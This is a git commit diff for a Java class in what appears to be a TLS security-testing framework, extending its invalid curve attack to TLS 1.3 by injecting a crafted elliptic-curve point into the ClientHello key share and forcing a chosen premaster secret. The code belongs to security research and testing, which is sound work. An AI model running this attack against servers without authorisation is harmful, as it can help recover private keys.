461f74afb84761f570f115aeb2f006c6152d3171
mmaehren <32199075+mmaehren@users.noreply.github.com>
2019-10-23 08:54:29 +0200

    TLS 1.3 Invalid Curve Attack support

--- Attacks/src/main/java/de/rub/nds/tlsattacker/attacks/impl/InvalidCurveAttacker.java
+++ Attacks/src/main/java/de/rub/nds/tlsattacker/attacks/impl/InvalidCurveAttacker.java
@@ -18,6 +18,7 @@ import de.rub.nds.tlsattacker.attacks.ec.oracles.RealDirectMessageECOracle;
 import de.rub.nds.tlsattacker.core.config.Config;
 import de.rub.nds.tlsattacker.core.constants.AlgorithmResolver;
 import de.rub.nds.tlsattacker.core.constants.HandshakeMessageType;
+import de.rub.nds.tlsattacker.core.constants.ProtocolVersion;
 import de.rub.nds.tlsattacker.core.constants.RunningModeType;
 import de.rub.nds.tlsattacker.core.crypto.ec.CurveFactory;
 import de.rub.nds.tlsattacker.core.crypto.ec.EllipticCurve;
@@ -26,8 +27,12 @@ import de.rub.nds.tlsattacker.core.crypto.ec.Point;
 import de.rub.nds.tlsattacker.core.crypto.ec.PointFormatter;
 import de.rub.nds.tlsattacker.core.exceptions.WorkflowExecutionException;
 import de.rub.nds.tlsattacker.core.protocol.message.ChangeCipherSpecMessage;
+import de.rub.nds.tlsattacker.core.protocol.message.ClientHelloMessage;
 import de.rub.nds.tlsattacker.core.protocol.message.ECDHClientKeyExchangeMessage;
 import de.rub.nds.tlsattacker.core.protocol.message.FinishedMessage;
+import de.rub.nds.tlsattacker.core.protocol.message.ServerHelloMessage;
+import de.rub.nds.tlsattacker.core.protocol.message.extension.ExtensionMessage;
+import de.rub.nds.tlsattacker.core.protocol.message.extension.KeyShareExtensionMessage;
 import de.rub.nds.tlsattacker.core.state.State;
 import de.rub.nds.tlsattacker.core.workflow.WorkflowExecutor;
 import de.rub.nds.tlsattacker.core.workflow.WorkflowExecutorFactory;
@@ -112,7 +117,7 @@ public class InvalidCurveAttacker extends Attacker<InvalidCurveAttackConfig> {
             }
             try {
                 WorkflowTrace trace = executeProtocolFlow();
-                if (!WorkflowTraceUtil.didReceiveMessage(HandshakeMessageType.SERVER_HELLO, trace)) {
+                if (!WorkflowTraceUtil.didReceiveMessage(HandshakeMessageType.SERVER_HELLO, trace) && getTlsConfig().getHighestProtocolVersion() != ProtocolVersion.TLS13) {
                     LOGGER.info("Did not receive ServerHello. Check your config");
 
                     return null;
@@ -134,27 +139,51 @@ public class InvalidCurveAttacker extends Attacker<InvalidCurveAttackConfig> {
         Config tlsConfig = getTlsConfig();
         WorkflowTrace trace = new WorkflowConfigurationFactory(tlsConfig).createWorkflowTrace(WorkflowTraceType.HELLO,
                 RunningModeType.CLIENT);
-        trace.addTlsAction(new SendAction(new ECDHClientKeyExchangeMessage(tlsConfig), new ChangeCipherSpecMessage(
-                tlsConfig), new FinishedMessage(tlsConfig)));
-        trace.addTlsAction(new ReceiveAction(new ChangeCipherSpecMessage(), new FinishedMessage()));
-        State state = new State(tlsConfig, trace);
-        WorkflowExecutor workflowExecutor = WorkflowExecutorFactory.createWorkflowExecutor(
-                tlsConfig.getWorkflowExecutorType(), state);
-        ECDHClientKeyExchangeMessage message = (ECDHClientKeyExchangeMessage) WorkflowTraceUtil.getFirstSendMessage(
-                HandshakeMessageType.CLIENT_KEY_EXCHANGE, trace);
-
+        
         EllipticCurve curve = CurveFactory.getCurve(config.getNamedGroup());
         ModifiableByteArray serializedPublicKey = ModifiableVariableFactory.createByteArrayModifiableVariable();
         Point basepoint = new Point(new FieldElementFp(config.getPublicPointBaseX(), curve.getModulus()), new FieldElementFp(config.getPublicPointBaseY(), curve.getModulus()));
         byte[] serialized = PointFormatter.formatToByteArray(config.getNamedGroup(), basepoint, config.getPointCompressionFormat());
         serializedPublicKey.setModification(ByteArrayModificationFactory.explicitValue(serialized));
-        message.setPublicKey(serializedPublicKey);
         ModifiableByteArray pms = ModifiableVariableFactory.createByteArrayModifiableVariable();
         byte[] explicitPMS = BigIntegers.asUnsignedByteArray(ArrayConverter.bigIntegerToByteArray(curve.getModulus()).length, premasterSecret);
         pms.setModification(ByteArrayModificationFactory.explicitValue(explicitPMS));
-        message.prepareComputations();
-        message.getComputations().setPremasterSecret(pms);
+        
+        if(tlsConfig.getHighestProtocolVersion() == ProtocolVersion.TLS13)
+        {
+            trace.addTlsAction(new ReceiveAction(new ServerHelloMessage(tlsConfig)));
+            trace.addTlsAction(new SendAction(new FinishedMessage(tlsConfig)));
+            ClientHelloMessage cHello = (ClientHelloMessage) WorkflowTraceUtil.getFirstSendMessage(
+                HandshakeMessageType.CLIENT_HELLO, trace); 
+            KeyShareExtensionMessage ksExt;
+            for(ExtensionMessage ext : cHello.getExtensions())
+            {
+                if(ext instanceof KeyShareExtensionMessage)
+                {
+                    ksExt = (KeyShareExtensionMessage)ext;
+                    ksExt.getKeyShareList().get(0).setPublicKey(serializedPublicKey); //we use exactly one key share
+                }
+            }    
+            
+            //TODO: use action / modification to influence key derivation for TLS 1.3
+            getTlsConfig().setDefaultPreMasterSecret(explicitPMS);
+        }
+        else
+        {
+            trace.addTlsAction(new SendAction(new ECDHClientKeyExchangeMessage(tlsConfig), new ChangeCipherSpecMessage(
+                tlsConfig), new FinishedMessage(tlsConfig)));
+            trace.addTlsAction(new ReceiveAction(new ChangeCipherSpecMessage(), new FinishedMessage()));
+            
+            ECDHClientKeyExchangeMessage message = (ECDHClientKeyExchangeMessage) WorkflowTraceUtil.getFirstSendMessage(
+                HandshakeMessageType.CLIENT_KEY_EXCHANGE, trace); 
+            message.setPublicKey(serializedPublicKey);
+            message.prepareComputations();
+            message.getComputations().setPremasterSecret(pms);
+        }
         LOGGER.info("Working with the follwoing premaster secret: " + ArrayConverter.bytesToHexString(explicitPMS));
+        
+        State state = new State(tlsConfig, trace);
+        WorkflowExecutor workflowExecutor = WorkflowExecutorFactory.createWorkflowExecutor(tlsConfig.getWorkflowExecutorType(), state);
         workflowExecutor.executeWorkflow();
         return trace;
     }
